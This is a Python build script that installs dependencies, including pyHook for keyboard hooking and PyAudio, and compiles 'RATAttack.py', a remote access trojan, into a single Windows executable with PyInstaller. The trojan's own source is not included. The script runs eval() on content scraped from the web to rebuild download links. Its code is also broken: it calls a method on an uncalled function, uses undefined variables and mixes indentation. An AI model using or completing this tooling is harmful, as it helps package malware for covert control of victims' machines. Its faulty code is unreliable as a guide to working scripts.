from os import system
from os.path import exists
from platform import machine
import sys

auto = len(sys.argv) == 2 and sys.argv[1] == '--yes'

if not auto:
    input("\nNow going to install dependencies and compile the rat, make sure you have prepped RATAttack.py beforehand\n\n\nPress ENTER to resume")

system('pip install -r requirements.txt')

def download_dependencies():
    if machine.lower() not in ['i386', 'amd64']:
	print('Unsupported architecture:', machine.lower())
	exit(1)

    import requests
    import re
    import sys
    v = sys.version[:3]
    v = v[0] + v[2]
    sess = requests.Session()
    txt = sess.get('https://www.lfd.uci.edu/~gohlke/pythonlibs/').text

    def dl(ml, mi):
        mi = mi.replace('&lt;'  , '<')
        mi = mi.replace('&#62;' , '>')
        mi = mi.replace('&#38;' , '&')
        ot = "https://download.lfd.uci.edu/pythonlibs/"
        for j in range(len(mi)):
            ot += chr(ml[ord(mi[j]) - 47])
        return ot

    arch = 'win_amd64' if machine().lower() == 'amd64' else 'win32' 

    def download_and_extract_file(dep):
        if dep == 'pyAudio':
            m = re.match('.*<a(.*)PyAudio&#8209;.&#46;.&#46;..&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch + '&#46;whl.*', txt, flags=re.M|re.S)
        elif dep == 'pyHook':
            m = re.match('.*<a(.*)pyHook.*cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch + '&#46;whl.*', txt, flags=re.M|re.S)
        m = re.match(' href=\'javascript:;\' onclick=\'&nbsp;javascript:dl\((.*)\);.*', m.group(1), flags=re.M|re.S)
        m = re.match('(.*), (".*")', m.group(1))
        ml = eval(m.group(1))
        mi = eval(m.group(2))

        deobfuscated_url = dl(ml,mi) # url for this python version on this architecture
        print(deobfuscated_url)
        res = sess.get(deobfuscated_url, headers={ 'User-Agent': 'Mozilla/5.0' }, stream=True)
        with open(dep + '‑0.....‑cp' + v + '‑cp' + v + 'm' + arch + '.whl', "wb") as wheel:
            wheel.write(res.content)
    
    download_and_extract_file('pyAudio')
    download_and_extract_file('pyHook')

download_dependencies()

system('pip install ' + fileA)
system('pip install ' + fileB)

if not auto:
    input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')

system('pyinstaller --clean --onefile "RATAttack.py"')

if exists('dist/RATAttack.exe'):
    print('\n\nScript has finished')
else:
    exit(1)
